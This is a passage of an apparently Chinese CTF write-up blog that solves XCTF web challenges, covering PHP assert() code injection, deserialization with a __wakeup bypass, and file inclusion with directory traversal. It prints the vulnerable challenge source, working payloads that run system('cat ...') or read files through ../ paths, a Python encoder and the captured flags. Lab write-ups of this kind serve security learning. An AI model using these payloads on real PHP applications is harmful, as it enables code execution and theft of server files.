class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>也就是说把我们输入的page相关字符串解析为<code>assert(&quot;strpos(&#39;templates/payload.php&#39;, &#39;..&#39;) === false&quot;)</code>，其中：</p><ul><li>strpos()：查找 “..” 在file字符串中第一次出现的位置，也就是说我们不能使用目录注入了</li><li>assert()：检查一个断言是否为 <strong><code>FALSE</code></strong>，如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</li></ul></blockquote><h4 id="4-构造payload"><a href="#4-构造payload" class="headerlink" title="4.构造payload"></a><code>4.构造payload</code></h4><blockquote><p>根据上文，我们可以构造如下payload：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1：page = <span class="string">'.system("cat templates/flag.php").'</span></span><br><span class="line">payload2：page = <span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//</span></span><br></pre></td></tr></table></figure><blockquote><p>被运行时，在index.php中被执行的形式为：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="string">"templates'.system("</span>cat templates/flag.php<span class="string">").'.php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('templates'.system("</span>cat templates/flag.php<span class="string">").'.php"</span><span class="string">', '</span>..<span class="string">') === false") or die("Detected hacking attempt!");</span></span><br><span class="line"><span class="string">assert("file_exists('</span>templates<span class="string">'.system("cat templates/flag.php").'</span>.php<span class="string">')") or die("That file doesn'</span>t exist!<span class="string">");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$file = "</span><span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//"</span></span><br><span class="line"><span class="string">assert("strpos('</span><span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//'</span>, <span class="string">'..'</span>) === <span class="keyword">false</span><span class="string">") or die("</span>Detected hacking attempt!<span class="string">");</span></span><br><span class="line"><span class="string">assert("</span>file_exists(<span class="string">''</span>,<span class="string">'..'</span>)===<span class="keyword">False</span> <span class="keyword">and</span> system(<span class="string">'cat templates/flag.php'</span>);<span class="comment">//')") or die("That file doesn't exist!");</span></span><br></pre></td></tr></table></figure><blockquote><p>注：不是很明白为什么这样构造</p></blockquote><h2 id="0x01-反序列化问题"><a href="#0x01-反序列化问题" class="headerlink" title="0x01 反序列化问题"></a><font color="navy"><code>0x01 反序列化问题</code></font></h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a><code>基础知识</code></h3><blockquote><p>要想知道反序列化问题，就必须知道 1) 序列化后的数据格式；2) 触发/绕过魔术函数的方法；</p><p><code>问题一：序列化后的数据格式</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;?php</span> </span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">tes1t</span></span></span><br><span class="line"><span class="class">&gt; </span>&#123;</span><br><span class="line">&gt; <span class="keyword">private</span> $flag = <span class="string">"Inactive"</span>;</span><br><span class="line">&gt; <span class="keyword">protected</span> $test = <span class="string">"test"</span>;</span><br><span class="line">&gt; <span class="keyword">public</span> $test1 = <span class="string">"test1"</span>;</span><br><span class="line">&gt; <span class="keyword">protected</span> $test2 = <span class="string">"test2"</span>;</span><br><span class="line">&gt; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span><span class="params">($flag)</span></span></span><br><span class="line"><span class="function">&gt; </span>&#123;</span><br><span class="line">&gt; <span class="keyword">$this</span>-&gt;flag = $flag;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; $object = <span class="keyword">new</span> tes1t();</span><br><span class="line">&gt; $object-&gt;set_flag(<span class="string">"Inactive"</span>);</span><br><span class="line">&gt; $data = serialize($object);</span><br><span class="line">&gt; <span class="keyword">echo</span> $data;</span><br><span class="line">&gt; <span class="meta">?&gt;</span> </span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>上述代码产生的数据格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; O:<span class="number">5</span>:<span class="string">"tes1t"</span>:<span class="number">4</span>:&#123;s:<span class="number">11</span>:<span class="string">"tes1tflag"</span>;s:<span class="number">8</span>:<span class="string">"Inactive"</span>;s:<span class="number">7</span>:<span class="string">"*test"</span>;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">5</span>:<span class="string">"test1"</span>;s:<span class="number">5</span>:<span class="string">"test1"</span>;s:<span class="number">8</span>:<span class="string">"*test2"</span>;s:<span class="number">5</span>:<span class="string">"test2"</span>;&#125; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>其中：</p><ul><li>O：表示一个对象</li><li>5：表示对象名占4个字符</li><li>“teslt”：表示对象名</li><li>4：表示该对象有4个属性（不含方法）</li><li>private：tesltflag =&gt; %00teslt%00flag</li><li>protected：<em>test =&gt; %00\</em>%00test</li></ul><p><code>问题二：触发/绕过魔术函数的方法</code></p><p>首先介绍一下魔术方法：</p><ul><li><strong>construct()</strong>：当对象创建时会自动调用(但在unserialize()时是不会自动调用的)</li><li><strong>wakeup()</strong>：unserialize()时会自动调用，反序列化无论如何都是要先调用<code>__wakeup</code>函数的，但是当属性数值&gt;属性真实个数时，就会跳过执行__wakeup()函数<ul><li><strong>存在漏洞的PHP版本</strong>：PHP5.6.25之前版本和7.0.10之前的7.x版本</li><li><strong>漏洞概述</strong>：<code>__wakeup()</code>魔法函数被绕过,导致执行了一些非预期效果的漏洞</li><li><strong>漏洞原理</strong>：<code>当对象的属性(变量)数大于实际的个数时,__wakeup()魔法函数被绕过</code></li></ul></li><li><strong>destruct()</strong>：当对象被销毁时会自动调用</li><li><strong>toString()</strong>：当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</li><li><strong>get()</strong>：当从不可访问的属性读取数据</li><li><strong>call()</strong>：在对象上下文中调用不可访问的方法时触发</li></ul><p>从序列化到反序列化这几个函数的执行过程是：<code>先调用__construct()-&gt;__sleep-&gt;__wakeup()-&gt;__toString ()-&gt;__destruct()</code></p></blockquote><h3 id="【XCTF-web】unserialize3"><a href="#【XCTF-web】unserialize3" class="headerlink" title="【XCTF-web】unserialize3"></a><font color="blue"><code>【XCTF-web】unserialize3</code></font></h3><h4 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><h4 id="2-题目分析"><a href="#2-题目分析" class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><blockquote><p>这里需要进行反序列化，并且要绕过 <code>__wakeup</code> 魔术函数，这里需要的知识点有：</p><ol><li>将数据序列化后的数据格式是什么样子？</li><li>如何绕过<code>__wakeup</code>函数？</li></ol></blockquote><h4 id="3-构造payload"><a href="#3-构造payload" class="headerlink" title="3.构造payload"></a><code>3.构造payload</code></h4><p>从上面的基础知识可以得到序列化后的数据格式，并且<code>当对象的属性(变量)数大于实际的个数时，__wakeup()魔法函数被绕过</code>，那么这里我们就可以构造出payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;,s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure><p>得到如下flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the answer is : cyberpeace&#123;7d67cd73e3c53d91d218d6a75563f5e3&#125;</span><br></pre></td></tr></table></figure><h3 id="【XCTF-web】Web-php-unserialize27"><a href="#【XCTF-web】Web-php-unserialize27" class="headerlink" title="【XCTF-web】Web_php_unserialize27"></a><font color="blue"><code>【XCTF-web】Web_php_unserialize27</code></font></h3><h4 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-题目分析-1"><a href="#2-题目分析-1" class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><p>我们一部分一部分的分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var = base64_decode($_GET[<span class="string">'var'</span>]);</span><br></pre></td></tr></table></figure><blockquote><p>对我们输入的payload进行base64解码，也就是说我们输入的payload要经过base64编码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var))</span><br></pre></td></tr></table></figure><blockquote><p>也就是说我们解码后的输入的形式如果是<code>[oc]:\d+:</code>（不区分大小写）则会输出<code>stop hacking</code>，但是如果我们的输入是<code>O:+4:</code>，就可以绕过正则过滤</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@unserialize($var);</span><br></pre></td></tr></table></figure><blockquote><p>反序列化我们的var值</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><blockquote><p>如果执行反序列化，那么就得执行该函数，所以和上一道题目一样，我们需要绕过该函数。</p></blockquote><h4 id="3-构造payload-1"><a href="#3-构造payload-1" class="headerlink" title="3.构造payload"></a><code>3.构造payload</code></h4><p>根据上文分析，我们可以构造如下的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+<span class="number">4</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">"\x00Demo\x00file"</span>;s:<span class="number">8</span>:<span class="string">"fl4g.php"</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>但是我们需要将其进行base64编码，这里就需要注意一个常见的坑，就是<code>private</code>属性的名字填写，两边要有两个<code>\x00</code>，这个时候我们不能直接将其进行base64编码，所以我们要将其用十六进制形式打开，改掉里面的内容，或者用下面的脚本进行修改：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"2.txt"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        line = line.strip(<span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(line)):</span><br><span class="line">            s += line[i]</span><br><span class="line">            <span class="keyword">if</span> i &lt; len(line) - <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> (line[i+<span class="number">1</span>] == <span class="string">"D"</span> <span class="keyword">and</span> line[i<span class="number">-2</span>] == <span class="string">"0"</span>) <span class="keyword">or</span> (line[i] == <span class="string">"o"</span> <span class="keyword">and</span> line[i+<span class="number">1</span>] == <span class="string">"f"</span>):</span><br><span class="line">                    s += chr(int(<span class="string">"0x00"</span>,<span class="number">16</span>))</span><br><span class="line">                    print(<span class="string">"1"</span>)</span><br><span class="line">    print(base64.b64encode(bytes(s,encoding=<span class="string">"gbk"</span>)))</span><br></pre></td></tr></table></figure></p><p>得到如下flag：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-文件包含问题"><a href="#0x02-文件包含问题" class="headerlink" title="0x02 文件包含问题"></a><font color="navy"><code>0x02 文件包含问题</code></font></h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a><font color="blue"><code>基础知识</code></font></h3><p><a href="https://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="noopener">参考链接</a></p><blockquote><p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。注意：<code>如果被包含的文件中无有效的php代码，则会直接把文件内容输出。</code></p><p>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。常见包含函数有：<code>include()</code>、<code>require()</code>，这两者的区别有：</p><ol><li><code>include</code> 是当代码执行到它的时候才加载文件，发生错误的时候只是给一个警告，然后继续往下执行</li><li><code>require</code> 是只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行</li></ol><p>require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模版文件<br>include_once()、require_once()与(include\require)的功能相同，只是区别于当重复调用的时候，它只会调用一次</p></blockquote><h3 id="【XCTF-web】warmup"><a href="#【XCTF-web】warmup" class="headerlink" title="【XCTF-web】warmup"></a><font color="blue"><code>【XCTF-web】warmup</code></font></h3><h4 id="1-题目描述-3"><a href="#1-题目描述-3" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><p><img src="/images/142-3.png" alt></p><blockquote><p>从上图可以看出，题目给出的网址打开之后只出现一个大大的笑脸，F12打开源码看见被注释掉了一段“source.php”，我们下面打开该网址，得到如下PHP源码：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-题目分析-2"><a href="#2-题目分析-2" class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><p>我们从上文源码中可以看到，还有一个<code>hint.php</code>文件，我们打开一下看看里面有什么提示信息，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><blockquote><p>从上文可以看出我们要的flag在ffffllllaaaagggg文件中，那么我们可能需要遍历目录查找该文件。</p></blockquote><p>下面我们分析上面的PHP源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>]) &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>]) &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>]))</span><br></pre></td></tr></table></figure><blockquote><p>如果同时满足上述三个条件，即可执行文件包含漏洞，这三个条件分别是：</p><ol><li>输入的字符串要为非空（因为如果输入的字符串是非空，empty返回False，那么!empty是True）</li><li>is_string()：要求输入的是字符串是字符串</li><li>要满足checkFile函数返回的是True</li></ol><p>下面我们就分析一下checkFile，我们要使得他的返回值为True</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>要求我们的输入为非空字符串</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>要求我们输入的字符串要为source.php或者hint.php，否则不执行。这里是第一个返回True的地方，我们先记为 ①</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">$page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>首先会执行<code>mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</code>，该函数会返回输入字符串之后加上<code>?</code>之后的首次出现<code>?</code>的位置，<code>mb_substr</code>函数会返回我们输入字符串从0到首次出现?之前的字符串，如果该字符串有”source.php”或者”index.php”则返回true，这里我们记为②</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">$_page = mb_substr(</span><br><span class="line">$_page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>会对我们输入的payload进行url解码，然后执行同上的操作，然后返回true，这里我们记为③</p></blockquote><h4 id="3-构造payload-2"><a href="#3-构造payload-2" class="headerlink" title="3.构造payload"></a><code>3.构造payload</code></h4><p>根据第2部分的分析，要想能够输入我们的payload，我们可以使得checkFile函数返回true的地方只有②和③</p><p>② 处的payload为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?(payload) 或者为 ?file=source.php%3F(payload)</span><br></pre></td></tr></table></figure><p>③ 处的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php%253F(payload)</span><br></pre></td></tr></table></figure><p>下面就是如何确定在哪个目录下，这就需要我们一个一个进行尝试了，在尝试之后发现<code>ffffllllaaaagggg</code>在/../../../../ffffllllaaaagggg中，所以payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">?file=source.php%3F/../../../../ffffllllaaaagggg</span><br><span class="line">?file=source.php%253F/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><h4 id="4-目录遍历问题"><a href="#4-目录遍历问题" class="headerlink" title="4.目录遍历问题"></a><code>4.目录遍历问题</code></h4><p>经过测试发现并确定，这种包含的前提是<code>包含的文件必须是当前文件夹不存在的文件</code>，<strong>只有这样才会将该文件解析成目录</strong>，从而遍历其他文件；此处<font color="navy"><strong>hint.php?被解析认为是一个目录，但该目录并不存在，因此第一次<code>../</code>仅仅又是回到当前source.php的目录下</strong></font>。</p><div class="table-container"><table><thead><tr><th style="text-align:left">目录遍历</th><th style="text-align:left">解析</th></tr></thead><tbody><tr><td style="text-align:left">../</td><td style="text-align:left">/var/www/html</td></tr><tr><td style="text-align:left">../../</td><td style="text-align:left">/var/www</td></tr><tr><td style="text-align:left">../../../</td><td style="text-align:left">/var</td></tr><tr><td style="text-align:left">../../../../</td><td 